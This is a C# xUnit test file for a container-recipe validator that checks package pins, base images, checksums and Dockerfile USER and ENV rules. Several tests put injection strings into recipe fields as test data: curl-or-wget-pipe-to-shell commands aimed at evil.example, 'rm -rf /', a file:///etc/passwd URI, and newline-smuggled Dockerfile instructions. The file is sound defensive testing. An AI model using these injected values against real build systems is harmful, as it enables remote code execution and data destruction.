using NodeKit.Authoring.Recipes;
using NodeKit.Validation.Recipes;
using Xunit;

namespace NodeKit.Tests.Recipes
{
    public class RecipeValidatorTests
    {
        private const string PinnedBaseImage = "condaforge/miniforge3:24.3.0-0@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        private const string ValidChecksum = "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";

        [Fact]
        public void Validate_Conda_WithBaseImageAndPackages_Passes()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.Conda,
                BaseImage = PinnedBaseImage,
                Packages = { "bwa=0.7.17=h5bf99c6_8" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.True(result.IsValid);
        }

        [Fact]
        public void Validate_Conda_WithoutPackages_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.Conda,
                BaseImage = PinnedBaseImage,
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-002");
        }

        [Fact]
        public void Validate_Conda_WithoutBaseImage_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.Conda,
                Packages = { "bwa=0.7.17=h5bf99c6_8" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-001");
        }

        [Fact]
        public void Validate_PackageMirror_WithoutMirrorUri_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.PackageMirror,
                BaseImage = PinnedBaseImage,
                Packages = { "bwa=0.7.17=h5bf99c6_8" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-003");
        }

        [Fact]
        public void Validate_PackageMirror_WithMirrorUriAndPackages_Passes()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.PackageMirror,
                BaseImage = PinnedBaseImage,
                PackageMirrorUri = "https://mirror.internal/conda-channel",
                Packages = { "bwa=0.7.17=h5bf99c6_8" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.True(result.IsValid);
        }

        [Fact]
        public void Validate_BioContainer_WithoutImageUri_Fails()
        {
            var recipe = new RecipeDocument { BuildKind = RecipeKind.BioContainer };

            var result = RecipeValidator.Validate(recipe);

            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-005");
        }

        [Fact]
        public void Validate_BioContainer_WithImageUri_Passes()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.BioContainer,
                BioContainerImageUri = "quay.io/biocontainers/bwa:0.7.17--h5bf99c6_8@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.True(result.IsValid);
        }

        [Fact]
        public void Validate_SourceBuild_WithoutChecksum_FailsWithMissingRule()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuild,
                BaseImage = PinnedBaseImage,
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceBuildCommands = { "make", "make install" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.Contains(result.Violations, v => v.RuleId == "L1-SRC-001");
        }

        [Fact]
        public void Validate_SourceBuild_WithMalformedChecksum_FailsWithFormatRule()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuild,
                BaseImage = PinnedBaseImage,
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = "not-a-real-checksum",
                SourceBuildCommands = { "make", "make install" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.Contains(result.Violations, v => v.RuleId == "L1-SRC-002");
        }

        [Fact]
        public void Validate_SourceBuild_WithoutBuildCommands_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuild,
                BaseImage = PinnedBaseImage,
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-007");
        }

        [Fact]
        public void Validate_SourceBuild_FullyPopulated_Passes()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuild,
                BaseImage = PinnedBaseImage,
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make", "make install" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.True(result.IsValid);
        }

        [Fact]
        public void Validate_DockerfileFallback_WithoutDockerfileContent_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.DockerfileFallback,
                BaseImage = PinnedBaseImage,
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-008");
        }

        [Fact]
        public void Validate_DockerfileFallback_WithDockerfileContent_Passes()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.DockerfileFallback,
                BaseImage = PinnedBaseImage,
                DockerfileContent = "FROM ubuntu:22.04@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\nRUN echo ok\nUSER 1000\n",
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.True(result.IsValid);
        }

        // Issue #19 follow-up: DockGuard's DSF001/DSF002 rules (USER required,
        // no secrets in ENV) are wired into WasmPolicyChecker for the GUI, but
        // NodeVault doesn't re-check them (confirmed via PLATFORM_MAP.md), so
        // the CLI's dockerfile-fallback path — the only build kind where the
        // Dockerfile is genuinely user-authored rather than
        // RecipeRenderer-generated — bypassed both entirely. Scoped to
        // DockerfileFallback only: applying this to every build kind broke all
        // of them, since RecipeRenderer's auto-generated Dockerfiles (Conda/
        // Micromamba/PackageMirror/SourceBuild/BioContainer) never include a
        // USER instruction.

        [Fact]
        public void Validate_DockerfileFallback_MissingUserInstruction_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.DockerfileFallback,
                BaseImage = PinnedBaseImage,
                DockerfileContent = $"FROM {PinnedBaseImage}\nRUN echo ok\n",
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-009");
        }

        [Fact]
        public void Validate_DockerfileFallback_UserRoot_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.DockerfileFallback,
                BaseImage = PinnedBaseImage,
                DockerfileContent = $"FROM {PinnedBaseImage}\nUSER root\n",
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-009");
        }

        [Fact]
        public void Validate_DockerfileFallback_EnvWithSecretPattern_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.DockerfileFallback,
                BaseImage = PinnedBaseImage,
                DockerfileContent = $"FROM {PinnedBaseImage}\nENV API_KEY=abc123\nUSER 1000\n",
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-010");
        }

        // Shell injection review finding: RecipeRenderer.RenderInstallerFamily
        // joins Packages/Channels straight into "RUN conda install ..." /
        // "RUN conda config --add channels ..." without any shell quoting, and
        // RenderSourceBuild embeds SourceUri inside a double-quoted curl
        // command. PackageVersionValidator only checked "does it have a
        // version pin" (a bare '=' check), so a package entry like
        // "bwa=0.7.17 && curl evil.sh | sh" passed L1-PKG-001 and the trailing
        // command was never scanned (it doesn't look like conda/pip install).
        // These allowlist checks run before RecipeRenderer ever sees the value.

        [Fact]
        public void Validate_Conda_PackageWithShellMetacharacters_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.Conda,
                BaseImage = PinnedBaseImage,
                Packages = { "bwa=0.7.17 && curl https://evil.example/x.sh | sh" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-011");
        }

        [Fact]
        public void Validate_Conda_ChannelWithShellMetacharacters_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.Conda,
                BaseImage = PinnedBaseImage,
                Packages = { "bwa=0.7.17=h5bf99c6_8" },
                Channels = { "bioconda; rm -rf /" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-012");
        }

        [Fact]
        public void Validate_PackageMirror_MirrorUriWithBacktick_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.PackageMirror,
                BaseImage = PinnedBaseImage,
                Packages = { "bwa=0.7.17=h5bf99c6_8" },
                PackageMirrorUri = "https://mirror.internal/`curl evil`",
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-013");
        }

        [Fact]
        public void Validate_SourceBuild_SourceUriBreaksOutOfQuoting_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuild,
                BaseImage = PinnedBaseImage,
                SourceUri = "https://example.org/x.tar.gz\" && curl https://evil.example/x.sh | sh && echo \"",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-014");
        }

        [Fact]
        public void Validate_SourceBuild_SourceUriWithoutHttpScheme_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuild,
                BaseImage = PinnedBaseImage,
                SourceUri = "file:///etc/passwd",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-014");
        }

        // RecipeRendererPropertyTests/RecipeValidatorFuzzTests (CsCheck) found
        // two real bugs on their first run, both from the same root cause:
        //
        // 1. _sourceUriPattern/_packageSpecPattern/_channelOrMirrorUriPattern
        //    were matched against a *trimmed* copy of the field while
        //    RecipeRenderer embeds the *raw* value — a value with a stray
        //    leading/trailing space validated as clean but still rendered
        //    with that whitespace in the Dockerfile.
        // 2. All four "^...$"-anchored regexes in this file relied on .NET's
        //    $ semantics, which (without RegexOptions.Multiline) match either
        //    the true end of string OR the position right before a single
        //    trailing '\n' — so a value ending in exactly one embedded
        //    newline (e.g. "bwa=0.7.17\n") incorrectly validated as clean.
        //
        // Both are fixed by matching the raw (untrimmed) value against \A...\z
        // anchors instead of ^...$. These two cases pin the exact fuzz-found
        // counterexamples as permanent regressions.

        [Fact]
        public void Validate_SourceBuild_SourceUriWithTrailingSpace_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuild,
                BaseImage = PinnedBaseImage,
                SourceUri = "https://example.org/x.tar.gz ",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-014");
        }

        [Fact]
        public void Validate_Conda_PackageWithTrailingEmbeddedNewline_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.Conda,
                BaseImage = PinnedBaseImage,
                Packages = { "bwa=0.7.17\n" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-011");
        }

        [Fact]
        public void Validate_SourceBuild_BuildCommandsMayStillContainShellOperators()
        {
            // SourceBuildCommands is intentionally NOT allowlisted — its entire
            // purpose is running shell build steps, so "&&"/"|" here are
            // expected usage, not injection. See the comment above
            // ValidateSourceBuild in RecipeValidator.cs.
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuild,
                BaseImage = PinnedBaseImage,
                SourceUri = "https://example.org/x.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "./configure --prefix=/usr && make -j4" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.True(result.IsValid);
        }

        // 외부 코드 리뷰 지적: RenderSourceBuild가 SourceBuildCommands를
        // string.Join(" && ", ...)로 합쳐 한 RUN 라인에 그대로 붙이므로, 값 안에
        // 개행이 있으면 셸 명령이 아니라 완전히 새로운 Dockerfile instruction으로
        // 해석된다. SourceBuild는 DockerfileFallback과 달리 USER/ENV 보안
        // 재검사를 받지 않아서 이 경로로 그 검사 전체를 우회할 수 있었다.

        [Fact]
        public void Validate_SourceBuild_BuildCommandWithEmbeddedNewline_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuild,
                BaseImage = PinnedBaseImage,
                SourceUri = "https://example.org/x.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make\nENV API_KEY=abc" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-015");
        }

        [Fact]
        public void Validate_SourceBuild_BuildCommandWithEmbeddedCarriageReturn_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuild,
                BaseImage = PinnedBaseImage,
                SourceUri = "https://example.org/x.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make\r\nFROM evil@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-015");
        }

        // 외부 코드 리뷰 지적: DockerfileParser는 "USER root:root"/"USER 0:0"을
        // 공백 없는 한 토큰("root:root"/"0:0")으로 그대로 넘기는데, 기존 검사는
        // user 문자열이 정확히 "root"/"0"과 같은지만 봐서 그룹이 붙은 형태는
        // 우회했다. "USER ${VAR}"도 빌드 시점 값에 따라 실제 사용자가 달라져
        // 정적으로 확인 불가능하므로 차단 대상이다.

        [Fact]
        public void Validate_DockerfileFallback_UserRootWithGroup_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.DockerfileFallback,
                BaseImage = PinnedBaseImage,
                DockerfileContent = $"FROM {PinnedBaseImage}\nUSER root:root\n",
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-009");
        }

        [Fact]
        public void Validate_DockerfileFallback_UserZeroWithGroup_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.DockerfileFallback,
                BaseImage = PinnedBaseImage,
                DockerfileContent = $"FROM {PinnedBaseImage}\nUSER 0:0\n",
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-009");
        }

        [Fact]
        public void Validate_DockerfileFallback_UserWithVariableReference_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.DockerfileFallback,
                BaseImage = PinnedBaseImage,
                DockerfileContent = $"FROM {PinnedBaseImage}\nUSER ${{RUNTIME_USER}}\n",
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-009");
        }

        [Fact]
        public void Validate_DockerfileFallback_UserNonRootWithGroup_Passes()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.DockerfileFallback,
                BaseImage = PinnedBaseImage,
                DockerfileContent = $"FROM {PinnedBaseImage}\nUSER 1000:1000\n",
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.True(result.IsValid);
        }

        // §13 R19: NodeVault의 최종 게이트는 name=version(버전-only) pin을
        // 거부하지만 NodeKit L1 allowlist(L1-RCP-011)는 통과시킨다 — 라이브
        // 테스트 n03에서 확인. strictReproducible=false(기본값)에서는 여전히
        // 허용하고, true일 때만 L1-RCP-016으로 미리 막는다.

        [Fact]
        public void Validate_Conda_VersionOnlyPin_PassesByDefault()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.Conda,
                BaseImage = PinnedBaseImage,
                Packages = { "bwa=0.7.17" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.True(result.IsValid);
        }

        [Fact]
        public void Validate_Conda_VersionOnlyPin_StrictReproducible_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.Conda,
                BaseImage = PinnedBaseImage,
                Packages = { "bwa=0.7.17" },
            };

            var result = RecipeValidator.Validate(recipe, strictReproducible: true);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-016");
        }

        [Fact]
        public void Validate_Conda_FullPin_StrictReproducible_Passes()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.Conda,
                BaseImage = PinnedBaseImage,
                Packages = { "bwa=0.7.17=h5bf99c6_8" },
            };

            var result = RecipeValidator.Validate(recipe, strictReproducible: true);

            Assert.True(result.IsValid);
        }

        [Fact]
        public void Validate_PackageMirror_VersionOnlyPin_StrictReproducible_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.PackageMirror,
                BaseImage = PinnedBaseImage,
                PackageMirrorUri = "https://mirror.internal/conda-channel",
                Packages = { "bwa=0.7.17" },
            };

            var result = RecipeValidator.Validate(recipe, strictReproducible: true);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-016");
        }

        [Fact]
        public void Validate_Conda_AutoGeneratedDockerfileWithoutUser_StillPasses()
        {
            // The USER requirement must NOT apply to build kinds whose
            // Dockerfile RecipeRenderer generates automatically — those never
            // contain a USER instruction, and applying this check
            // unconditionally would make every non-dockerfile-fallback recipe
            // permanently fail L1 (confirmed by trying it).
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.Conda,
                BaseImage = PinnedBaseImage,
                Packages = { "bwa=0.7.17=h5bf99c6_8" },
                Channels = { "bioconda" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.DoesNotContain(result.Violations, v => v.RuleId is "L1-RCP-009" or "L1-RCP-010");
        }

        // §13 R22-B (docs/NODEKIT_SOURCEBUILD_STRUCTURED_INTENT_DESIGN.md §5,
        // §10 D-1/D-2/D-8). RecipeKind.SourceBuildStructured reuses
        // SourceUri/SourceChecksum/SourceBuildCommands validation from legacy
        // SourceBuild (ValidateSourceFetchFields) and adds BuildProfile/
        // RuntimeProfile selection validation.

        [Fact]
        public void Validate_SourceBuildStructured_WithCuratedProfiles_Passes()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuildStructured,
                BuildProfile = "generic",
                RuntimeProfile = "minimal",
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.True(result.IsValid);
        }

        [Fact]
        public void Validate_SourceBuildStructured_MissingBuildProfile_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuildStructured,
                RuntimeProfile = "minimal",
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-017" && v.Field == "BuildProfile");
        }

        [Fact]
        public void Validate_SourceBuildStructured_UnknownBuildProfile_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuildStructured,
                BuildProfile = "not-a-real-profile",
                RuntimeProfile = "minimal",
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-017" && v.Field == "BuildProfile");
        }

        [Fact]
        public void Validate_SourceBuildStructured_AdvancedBuildProfileWithoutImage_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuildStructured,
                BuildProfile = "advanced",
                RuntimeProfile = "minimal",
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-017" && v.Field == "BuildProfileImage");
        }

        [Fact]
        public void Validate_SourceBuildStructured_AdvancedBuildProfileWithUnpinnedImage_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuildStructured,
                BuildProfile = "advanced",
                BuildProfileImage = "ubuntu:22.04",
                RuntimeProfile = "minimal",
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-017" && v.Field == "BuildProfileImage");
        }

        [Fact]
        public void Validate_SourceBuildStructured_AdvancedBuildProfileWithPinnedImage_Passes()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuildStructured,
                BuildProfile = "advanced",
                BuildProfileImage = PinnedBaseImage,
                RuntimeProfile = "minimal",
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.True(result.IsValid);
        }

        // 외부 리뷰 발견(High): 예전엔 profileImage.Contains("@sha256:")만 검사해서
        // "@sha256:<진짜 digest>" 뒤에 개행 + 임의 Dockerfile 명령을 붙인 값이
        // 그대로 통과했다 — RecipeRenderer.RenderSourceBuildStructured가 이
        // 값을 그대로 "FROM " + profileImage에 이어 붙이므로, 검증을 통과하면
        // 렌더링된 Dockerfile에 임의 명령(RUN, USER 등)이 그대로 주입됐다.
        // BuildProfileImage/RuntimeProfileImage 둘 다 같은 ValidateProfileSelection을
        // 타므로 두 필드 모두 재현한다.
        [Theory]
        [InlineData("BuildProfileImage")]
        [InlineData("RuntimeProfileImage")]
        public void Validate_SourceBuildStructured_AdvancedProfileImageWithNewlineInjection_Fails(string field)
        {
            var maliciousImage =
                "docker.io/library/debian:bookworm-slim@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" +
                "\nUSER root\nRUN wget http://evil.example/x.sh -O- | sh";
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuildStructured,
                BuildProfile = field == "BuildProfileImage" ? "advanced" : "generic",
                BuildProfileImage = field == "BuildProfileImage" ? maliciousImage : string.Empty,
                RuntimeProfile = field == "RuntimeProfileImage" ? "advanced" : "minimal",
                RuntimeProfileImage = field == "RuntimeProfileImage" ? maliciousImage : string.Empty,
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            var expectedRuleId = field == "BuildProfileImage" ? "L1-RCP-017" : "L1-RCP-018";
            Assert.Contains(result.Violations, v => v.RuleId == expectedRuleId && v.Field == field);
        }

        [Fact]
        public void Validate_SourceBuildStructured_AdvancedProfileImageWithTruncatedDigestPlusTrailingChar_Fails()
        {
            // Same root cause as the newline-injection case, minimal repro:
            // one extra character after an otherwise-valid 64-hex digest must
            // still be rejected -- confirms the check is \z-anchored (exact
            // length), not just "contains 64+ hex chars somewhere".
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuildStructured,
                BuildProfile = "generic",
                RuntimeProfile = "advanced",
                RuntimeProfileImage = PinnedBaseImage + "x",
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-018" && v.Field == "RuntimeProfileImage");
        }

        [Fact]
        public void Validate_SourceBuildStructured_AdvancedRuntimeProfileWithPinnedImage_Passes()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuildStructured,
                BuildProfile = "generic",
                RuntimeProfile = "advanced",
                RuntimeProfileImage = PinnedBaseImage,
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.True(result.IsValid);
        }

        [Fact]
        public void Validate_SourceBuildStructured_MissingRuntimeProfile_Fails()
        {
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuildStructured,
                BuildProfile = "generic",
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-018" && v.Field == "RuntimeProfile");
        }

        [Fact]
        public void Validate_SourceBuildStructured_ReusesSourceFetchFieldValidation()
        {
            // SourceUri/SourceChecksum/SourceBuildCommands checks are shared
            // with legacy SourceBuild (ValidateSourceFetchFields) — confirm
            // the newline-injection guard (#31/L1-RCP-015) still applies here.
            var recipe = new RecipeDocument
            {
                BuildKind = RecipeKind.SourceBuildStructured,
                BuildProfile = "generic",
                RuntimeProfile = "minimal",
                SourceUri = "https://github.com/lh3/bwa/archive/refs/tags/v0.7.17.tar.gz",
                SourceChecksum = ValidChecksum,
                SourceBuildCommands = { "make\nENV API_KEY=abc" },
            };

            var result = RecipeValidator.Validate(recipe);

            Assert.False(result.IsValid);
            Assert.Contains(result.Violations, v => v.RuleId == "L1-RCP-015");
        }
    }
}
